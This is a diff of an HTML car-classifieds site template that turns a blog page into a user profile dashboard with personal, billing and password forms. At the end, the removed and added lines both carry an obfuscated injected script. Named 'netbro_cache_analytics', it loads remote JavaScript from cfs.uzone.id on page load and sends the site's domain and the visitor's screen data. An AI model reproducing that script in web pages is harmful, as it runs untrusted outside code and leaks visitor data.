@@ -43,8 +43,24 @@
                     <span class="site-tagline">Buying or Selling,<br>just got easier!</span>
                 </div>
                 <div class="header-right">
-                    <div class="user-login-panel">
-                        <a href="#" class="user-login-btn" data-toggle="modal" data-target="#loginModal"><i class="icon-profile"></i></a>
+                    <div class="user-login-panel logged-in-user">
+                        <a href="#" class="user-login-btn" id="userdropdown" data-toggle="dropdown">
+                            <img src="images/user1.jpg" alt="">
+                            <span class="user-informa">
+                                <span class="meta-data">Welcome</span>
+                                <span class="user-name">Username dss</span>
+                            </span>
+                            <span class="user-dd-dropper"><i class="fa fa-angle-down"></i></span>
+                        </a>
+                        <ul class="dropdown-menu" role="menu" aria-labelledby="userdropdown">
+                            <li><a href="user-dashboard.html">Dashboard</a></li>
+                            <li><a href="user-dashboard-saved-searches.html">Saved Searches</a></li>
+                            <li><a href="user-dashboard-saved-cars.html">Saved Cars</a></li>
+                            <li><a href="user-dashboard-manage-ads.html">Manage Ads</a></li>
+                            <li><a href="user-dashboard-profile.html">My Profile</a></li>
+                            <li><a href="user-dashboard-settings.html">Settings</a></li>
+                            <li><a href="#">Log Out</a></li>
+                        </ul>
                     </div>
                     <div class="topnav dd-menu">
                         <ul class="top-navigation sf-menu">
@@ -414,132 +430,192 @@
             </div>
         </div>
    	</div>
-    <!-- Start Page header -->
-    <div class="page-header parallax" style="background-image:url(images/page_header3.jpg);">
-    	<div class="container">
-        	<h1 class="page-title">Blog</h1>
-       	</div>
-    </div>
-    <!-- Utiity Bar -->
-    <div class="utility-bar">
-    	<div class="container">
-        	<div class="row">
-            	<div class="col-md-8 col-sm-6 col-xs-8">
-                    <ol class="breadcrumb">
-                        <li><a href="index.html">Home</a></li>
-                        <li class="active">Blog</li>
-                    </ol>
-            	</div>
-                <div class="col-md-4 col-sm-6 col-xs-4">
-                </div>
-            </div>
-      	</div>
-    </div>
     <!-- Start Body Content -->
   	<div class="main" role="main">
-    	<div id="content" class="content full">
-            <div class="container">
-              	<div class="row">
-                	<div class="col-md-9 posts-archive">
-                  		<article class="post format-standard">
-                    		<div class="row">
-                      			<div class="col-md-4 col-sm-4"> <a href="single-post.html"><img src="images/post1.jpg" alt="" class="img-thumbnail"></a> </div>
-                      			<div class="col-md-8 col-sm-8">
-                                    <div class="post-actions">
-                                        <div class="post-date">November 27, 2014</div>
-                                        <div class="comment-count"><a href="single-post.html"><i class="icon-dialogue-text"></i> 20</a></div>
-                                    </div>
-                        			<h3 class="post-title"><a href="single-post.html">Suspendisse eget ligula in nulla iaculis interdum nec</a></h3>
-                        			<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla convallis egestas rhoncus. Donec facilisis fermentum sem, ac viverra ante luctus vel. Donec vel mauris quam. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla convallis egestas rhoncus. Donec facilisis fermentum sem, ac viverra ante luctus vel. Donec vel mauris quam... <a href="single-post.html" class="continue-reading">Continue reading <i class="fa fa-long-arrow-right"></i></a></p>
-                                   	<div class="post-meta">Posted in: <a href="#">Financial</a></div>
-                      			</div>
-                    		</div>
-                  		</article>
-                  		<article class="post format-standard">
-                    		<div class="row">
-                      			<div class="col-md-4 col-sm-4"> <a href="single-post.html"><img src="images/post2.jpg" alt="" class="img-thumbnail"></a> </div>
-                      			<div class="col-md-8 col-sm-8">
-                                    <div class="post-actions">
-                                        <div class="post-date">November 25, 2014</div>
-                                        <div class="comment-count"><a href="single-post.html"><i class="icon-dialogue-text"></i> 54</a></div>
-                                    </div>
-                        			<h3 class="post-title"><a href="single-post.html">Lorem ipsum dolor sit amet, consectetur adipiscing elit</a></h3>
-                        			<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla convallis egestas rhoncus. Donec facilisis fermentum sem, ac viverra ante luctus vel. Donec vel mauris quam. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla convallis egestas rhoncus. Donec facilisis fermentum sem, ac viverra ante luctus vel. Donec vel mauris quam... <a href="single-post.html" class="continue-reading">Continue reading <i class="fa fa-long-arrow-right"></i></a></p>
-                                   	<div class="post-meta">Posted in: <a href="#">New Launch</a></div>
-                      			</div>
-                    		</div>
-                  		</article>
-                  		<article class="post format-standard">
-                    		<div class="row">
-                      			<div class="col-md-4 col-sm-4"> <a href="single-post.html"><img src="images/post3.jpg" alt="" class="img-thumbnail"></a> </div>
-                      			<div class="col-md-8 col-sm-8">
-                                    <div class="post-actions">
-                                        <div class="post-date">October 30, 2014</div>
-                                        <div class="comment-count"><a href="single-post.html"><i class="icon-dialogue-text"></i> 32</a></div>
-                                    </div>
-                        			<h3 class="post-title"><a href="single-post.html">2015 Proin enim quam, vulputate</a></h3>
-                        			<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla convallis egestas rhoncus. Donec facilisis fermentum sem, ac viverra ante luctus vel. Donec vel mauris quam. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla convallis egestas rhoncus. Donec facilisis fermentum sem, ac viverra ante luctus vel. Donec vel mauris quam... <a href="single-post.html" class="continue-reading">Continue reading <i class="fa fa-long-arrow-right"></i></a></p>
-                                   	<div class="post-meta">Posted in: <a href="#">Trial run</a></div>
-                      			</div>
-                    		</div>
-                  		</article>
-                        <ul class="pagination">
-                            <li><a href="#"><i class="fa fa-chevron-left"></i></a></li>
-                            <li class="active"><a href="#">1</a></li>
-                            <li><a href="#">2</a></li>
-                            <li><a href="#">3</a></li>
-                            <li><a href="#">4</a></li>
-                            <li><a href="#">5</a></li>
-                            <li><a href="#"><i class="fa fa-chevron-right"></i></a></li>
-                        </ul>
+    	<div id="content" class="content full dashboard-pages">
+        	<div class="container">
+            	<div class="dashboard-wrapper">
+                    <div class="row">
+                        <div class="col-md-3 col-sm-4">
+                            <!-- SIDEBAR -->
+                            <div class="users-sidebar tbssticky">
+                            	<a href="user-dashboard.html" class="btn btn-block btn-primary add-listing-btn">New Ad listing</a>
+                                <ul class="list-group">
+                                    <li class="list-group-item"> <span class="badge">5</span> <a href="user-dashboard.html"><i class="fa fa-home"></i> Dashboard</a></li>
+                                    <li class="list-group-item"> <span class="badge">5</span> <a href="user-dashboard-saved-searches.html"><i class="fa fa-folder-o"></i> Saved Searches</a></li>
+                                    <li class="list-group-item"> <span class="badge">12</span> <a href="user-dashboard-saved-cars.html"><i class="fa fa-star-o"></i> Saved Cars</a></li>
+                                    <li class="list-group-item"> <a href="add-listing-form.html"><i class="fa fa-plus-square-o"></i> Create new Ad</a></li>
+                                    <li class="list-group-item"> <span class="badge">2</span> <a href="user-dashboard-manage-ads.html"><i class="fa fa-edit"></i> Manage Ads</a></li>
+                                    <li class="list-group-item active"> <a href="user-dashboard-profile.html"><i class="fa fa-user"></i> My Profile</a></li>
+                                    <li class="list-group-item"> <a href="user-dashboard-settings.html"><i class="fa fa-cog"></i> Account Settings</a></li>
+                                    <li class="list-group-item"> <a href="javascript:void(0)"><i class="fa fa-sign-out"></i> Log Out</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="col-md-9 col-sm-8">
+                        	<h2>My Profile</h2>
+                            <div class="dashboard-block">
+                                <div class="tabs profile-tabs">
+                                    <ul class="nav nav-tabs">
+                                        <li class="active"> <a data-toggle="tab" href="#personalinfo" aria-controls="personalinfo" role="tab">Personal Info</a></li>
+                                        <li> <a data-toggle="tab" href="#billinginfo" aria-controls="billinginfo" role="tab">Billing Info</a></li>
+                                        <li> <a data-toggle="tab" href="#changepassword" aria-controls="changepassword" role="tab">Change Password</a></li>
+                                    </ul>
+                                    <form>
+                                        <div class="tab-content">
+                                            <!-- PROFIE PERSONAL INFO -->
+                                            <div id="personalinfo" class="tab-pane fade active in">
+                                                <div class="row">
+                                                    <div class="col-md-8">
+                                                        <div class="row">
+                                                            <div class="col-md-6">
+                                                            	<label>First name*</label>
+                                                                <input type="text" class="form-control" placeholder="" required>
+                                                            </div>
+                                                            <div class="col-md-6">
+                                                            	<label>Last name</label>
+                                                                <input type="text" class="form-control" placeholder="">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row">
+                                                            <div class="col-md-6">
+                                                            	<label>Email*</label>
+                                                                <input type="text" class="form-control" placeholder="mail@example.com" required>
+                                                            </div>
+                                                            <div class="col-md-6">
+                                                            	<label>Phone</label>
+                                                                <input type="text" class="form-control" placeholder="000-00-0000">
+                                                            </div>
+                                                        </div>
+                                                        
+                                                        <h3>Security Question</h3>
+                            							<div class="lighter"><p>Please choose a security question so we can better identify you if you forget your password, or in regard to your ad.</p></div>
+                                                        <label>Question</label>
+                                                        <select name="Security Questions" class="form-control selectpicker">
+                                                            <option selected>What is your maiden name?</option>
+                                                            <option selected>What is your pet's name?</option>
+                                                            <option selected>What is your first school name?</option>
+                                                            <option selected>What is your place of birth name?</option>
+                                                            <option selected>Who is your favourite actor?</option>
+                                                       	</select>
+                                                        <label>Answer</label>
+                                                        <input type="password" class="form-control">
+
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- PROFIE BILLING INFO -->
+                                            <div id="billinginfo" class="tab-pane fade">
+                                                <div class="row">
+                                                    <div class="col-md-8">
+                                                        <div class="row">
+                                                            <div class="col-md-6">
+                                                        		<label>City*</label>
+                                                                <input type="text" class="form-control" placeholder="" required>
+                                                            </div>
+                                                            <div class="col-md-6">
+                                                        		<label>Zip*</label>
+                                                                <input type="text" class="form-control" placeholder="" required>
+                                                            </div>
+                                                        </div>
+                                                        <div class="row">
+                                                            <div class="col-md-6">
+                                                        		<label>State*</label>
+                                                                <select name="State" class="form-control selectpicker" required>
+                                                                    <option selected>Select</option>
+                                                                    <option value="AL">Alabama</option>
+                                                                    <option value="AK">Alaska</option>
+                                                                    <option value="AZ">Arizona</option>
+                                                                    <option value="AR">Arkansas</option>
+                                                                    <option value="CA">California</option>
+                                                                    <option value="CO">Colorado</option>
+                                                                    <option value="CT">Connecticut</option>
+                                                                    <option value="DE">Delaware</option>
+                                                                    <option value="DC">District Of Columbia</option>
+                                                                    <option value="FL">Florida</option>
+                                                                    <option value="GA">Georgia</option>
+                                                                    <option value="HI">Hawaii</option>
+                                                                    <option value="ID">Idaho</option>
+                                                                    <option value="IL">Illinois</option>
+                                                                    <option value="IN">Indiana</option>
+                                                                    <option value="IA">Iowa</option>
+                                                                    <option value="KS">Kansas</option>
+                                                                    <option value="KY">Kentucky</option>
+                                                                    <option value="LA">Louisiana</option>
+                                                                    <option value="ME">Maine</option>
+                                                                    <option value="MD">Maryland</option>
+                                                                    <option value="MA">Massachusetts</option>
+                                                                    <option value="MI">Michigan</option>
+                                                                    <option value="MN">Minnesota</option>
+                                                                    <option value="MS">Mississippi</option>
+                                                                    <option value="MO">Missouri</option>
+                                                                    <option value="MT">Montana</option>
+                                                                    <option value="NE">Nebraska</option>
+                                                                    <option value="NV">Nevada</option>
+                                                                    <option value="NH">New Hampshire</option>
+                                                                    <option value="NJ">New Jersey</option>
+                                                                    <option value="NM">New Mexico</option>
+                                                                    <option value="NY">New York</option>
+                                                                    <option value="NC">North Carolina</option>
+                                                                    <option value="ND">North Dakota</option>
+                                                                    <option value="OH">Ohio</option>
+                                                                    <option value="OK">Oklahoma</option>
+                                                                    <option value="OR">Oregon</option>
+                                                                    <option value="PA">Pennsylvania</option>
+                                                                    <option value="RI">Rhode Island</option>
+                                                                    <option value="SC">South Carolina</option>
+                                                                    <option value="SD">South Dakota</option>
+                                                                    <option value="TN">Tennessee</option>
+                                                                    <option value="TX">Texas</option>
+                                                                    <option value="UT">Utah</option>
+                                                                    <option value="VT">Vermont</option>
+                                                                    <option value="VA">Virginia</option>
+                                                                    <option value="WA">Washington</option>
+                                                                    <option value="WV">West Virginia</option>
+                                                                    <option value="WI">Wisconsin</option>
+                                                                    <option value="WY">Wyoming</option>
+                                                                </select>
+                                                           	</div>
+                                                            <div class="col-md-6">
+                                                            	<label>&nbsp;</label>
+                                                            	<input type="text" class="form-control" disabled value="US">
+                                                            </div>
+                                                       	</div>
+                                                  	</div>
+                                               	</div>
+                                            </div>
+                                            <!-- PROFIE CHANGE PASSWORD -->
+                                            <div id="changepassword" class="tab-pane fade">
+                                            	<div class="row">
+                                                    <div class="col-md-8">
+                                                        <div class="row">
+                                                            <div class="col-md-6">
+                                                        		<label>Old Password</label>
+                                                                <input type="password" class="form-control" placeholder="">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row">
+                                                            <div class="col-md-6">
+                                                        		<label>New password</label>
+                                                                <input type="password" class="form-control" placeholder="">
+                                                            </div>
+                                                            <div class="col-md-6">
+                                                        		<label>Confirm new password</label>
+                                                                <input type="password" class="form-control" placeholder="">
+                                                            </div>
+                                                        </div>
+                                                  	</div>
+                                               	</div>
+                                            </div>
+                                        </div>
+                                        <button type="submit" class="btn btn-info">Update details</button>
+                                    </form>
+                                </div>
+                            </div>
+                       	</div>
                     </div>
-                    <!-- Start Sidebar -->
-                    <div class="col-md-3 sidebar">
-                        <div class="widget sidebar-widget search-form-widget">
-                            <div class="input-group input-group-lg">
-                                <input type="text" class="form-control" placeholder="Search Posts...">
-                                <span class="input-group-btn">
-                                    <button class="btn btn-default" type="button"><i class="fa fa-search fa-lg"></i></button>
-                                </span>
-                            </div>
-                        </div>
-                        <div class="widget sidebar-widget widget_categories">
-                            <h3 class="widgettitle">Post Categories</h3>
-                            <ul>
-                                <li><a href="#">Financial</a> (10)</li>
-                                <li><a href="#">Trial run</a> (12)</li>
-                                <li><a href="#">New Launch</a> (34)</li>
-                                <li><a href="#">Advice</a> (14)</li>
-                                <li><a href="#">Uncategorized</a> (114)</li>
-                            </ul>
-                        </div>
-                        <div class="widget sidebar-widget widget_recent_reviews">
-                            <h3 class="widgettitle">Latest Reviews</h3>
-                            <div class="post-block post-review-block">
-                                <div class="review-status">
-                                    <strong>3.6</strong>
-                                    <span>Out of 5</span>
-                                </div>
-                                <h3 class="post-title"><a href="single-review-post.html">Lorem ipsum dolor sit amet, consectetur adipiscing elit</a></h3>
-                            </div>
-                            <div class="post-block post-review-block">
-                                <div class="review-status">
-                                    <strong>4.1</strong>
-                                    <span>Out of 5</span>
-                                </div>
-                                <h3 class="post-title"><a href="single-review-post.html">Curabitur nec nulla lectus, non hendrerit lorem porttitor eget</a></h3>
-                            </div>
-                            <div class="post-block post-review-block">
-                                <div class="review-status">
-                                    <strong>5.0</strong>
-                                    <span>Out of 5</span>
-                                </div>
-                                <h3 class="post-title"><a href="single-review-post.html">2014 Proin enim quam, vulputate at lobortis quis, condimentum at justo</a></h3>
-                            </div>
-                        </div>
-                    </div>
-              	</div>
-            </div>
+                </div>
+           	</div>
         </div>
    	</div>
     <!-- End Body Content -->
@@ -711,5 +787,5 @@
     <li><img alt="" src="style-switcher/backgrounds/images/img5-thumb.png" data-nr="4" width="20" height="20"></li>
   </ul>
   <small>*only for boxed layout</small> </div>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKeveLkyvl6e6L8ZTjZ9nsgYD66t9NhVFLNIBxg5TK%2fFwyf7E7aAIkv4Juoq1urMjqPfpzdc9pFde7GDHmfbAPebfMuBnkTEdUkAQpVrL170RV6Ea9WN2KDBk6KVtT10qc9gd02uqUGeByXMuDRNqexueAsY5EXbZ3NxHdB8W9J9EtQZQccgraGSXAH0TfRde5dKVNJ8I1JgZ1QTvVGppXBBYCerVRp0cd5rV65ENKSFF2unYiQodoqLsbzY3cGACWUFjXIMPqGH9znh4gE5cWzvsSQMxvPSBKNFk4Ow4RqsDtxaPN%2f65lOc1BUABak5ItZ06n9zE0aDrPT0hVddS4icOh6OV%2bMLCL3QTTrXlQGssI8UNepZph%2f59fteB8R1sJi1Zud9sW%2fW4i9vhmwCwRaA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKeveLkyvl6e5D%2bNqP5Dmf9g6clGdgGiCg1eAmllPTo2mj1wbQA%2fhj5xv5e19I3md5vw6mf%2bxn2c9JzEcdx1LgR9dHlg6VccjUXziOvhAlEziITQsHCKlKVuKx4XFHTC8s%2bPzEaYQCiW7zdjh6G4AayCLkrlUnE99FF2guOIXbZAehsfPGN2BV8HgKMvV9ChiKcdsEXt%2bjsSWdnbo9HoijZg08Bno7fPDXcb9Fe%2b%2fMnsQgSqBZdfkbGZLL2IwR%2bf6rmOP4qmLHqumx9fTXbfyaKHFnb03XhR2CLUURdJ%2bxlFdiW4OavdV7%2fFh%2bWYUkr9ARcjQwwJOCsFEeHqO8n%2byos93vTBFpiuCX%2bD1r60x31w5UkxaiiIRd56sUNd0Aja4qOhX4rYnsuF3V2z7%2b8jZeOvDyKV2eqZCHFjaKyIUWgyopdlD6W9vH2w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>
